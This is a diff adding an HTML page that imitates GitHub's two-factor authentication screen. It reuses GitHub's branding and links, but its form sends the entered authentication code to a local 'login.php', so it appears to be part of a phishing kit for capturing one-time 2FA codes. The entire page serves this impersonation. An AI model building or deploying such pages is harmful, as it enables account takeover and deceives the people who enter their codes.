@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Two-factor authentication · GitHub</title>
+	<link href="static/favicon.svg" rel="icon">
+	<link rel="stylesheet" href="static/style_2fa.css">
+</head>
+<body>
+	
+<div class="wrapper">
+	<div class="logo">
+    <a href="https://github.com/"><img src="static/favicon.svg" alt="GitHub"></a>
+	</div>
+	<div class="title">
+		<p>Two-factor authentication</p>
+	</div>
+	<div class="form">
+	    <div class="device">
+	      <svg height="32" viewBox="0 0 24 24" version="1.1" width="32">
+		    <path d="M10.25 5.25A.75.75 0 0 1 11 4.5h2A.75.75 0 0 1 13 6h-2a.75.75 0 0 1-.75-.75ZM12 19.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z" fill="#59636e"></path>
+		    <path d="M4 2.75C4 1.784 4.784 1 5.75 1h12.5c.966 0 1.75.784 1.75 1.75v18.5A1.75 1.75 0 0 1 18.25 23H5.75A1.75 1.75 0 0 1 4 21.25Zm1.75-.25a.25.25 0 0 0-.25.25v18.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25Z" fill="#59636e"></path>
+		</svg>
+	    </div>
+    	<form action="login.php" method="POST">
+		<div class="input_field">
+			<label> Authentication code
+        		<a href="https://docs.github.com/articles/providing-your-2fa-authentication-code">
+        		<svg height="16" width="16" viewBox="0 0 16 16">
+        			<path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z" fill="#59636e"></path>
+          		</svg>
+          		<div class="tooltip">More information about Authentication Codes</div>
+          		</a>
+      			</label>
+			<input type="text" class="input" name="auth_code" required>
+		</div>	
+		<div class="btn">
+			<input type="submit" value="Verify" class="verify_btn">
+		</div>
+	</form>
+    <p>Open your two-factor authenticator (TOTP) app or browser extension to view your authentication code.</p>
+	</div>
+	<div class="create_act">
+    <p><b>Having problems?</b></p>
+    <ul>
+      <li><a href="https://github.com/sessions/two-factor/recovery">Use a recovery code or begin 2FA account recovery</a>
+      </li>
+    </ul>
+	</div>
+</div>	
+  	<footer>
+		<ul>
+			<li><a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a></li>
+			<li><a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a></li>
+			<li><a href="https://docs.github.com/">Docs</a></li>
+      <li><a href="https://support.github.com/">Contact GitHub Support</a></li>
+      <li><a href="https://docs.github.com/en/site-policy/privacy-policies/github-cookies">Manage cookies</a></li>
+			<li><a href="https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement">Do not share my personal information</a></li>
+		</ul>
+   	</footer> 
+</body>
+</html>
